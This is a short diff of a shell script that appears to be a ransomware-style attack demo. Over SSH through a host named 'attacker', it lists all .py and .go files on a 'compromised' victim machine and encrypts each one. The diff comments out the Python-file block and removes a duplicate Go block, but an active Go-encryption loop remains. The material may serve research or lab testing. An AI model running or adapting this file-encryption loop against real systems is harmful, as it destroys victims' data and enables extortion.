@@ -63,21 +63,13 @@ sleep 5 # let the victim connect
     done
 ) &
 
-# Encrypt all python files
-(
-    output=$(ssh attacker "byossh compromised 'find / | grep .py'" | sed '1d')
-    for file in $output; do
-        encrypt_file $file
-    done
-) &
-
-# Encrypt all go files
-(
-    output=$(ssh attacker "byossh compromised 'find / | grep .go'" | sed '1d')
-    for file in $output; do
-        encrypt_file $file
-    done
-) &
+# # Encrypt all python files
+# (
+#     output=$(ssh attacker "byossh compromised 'find / | grep .py'" | sed '1d')
+#     for file in $output; do
+#         encrypt_file $file
+#     done
+# ) &
 
 # Encrypt all go files
 (
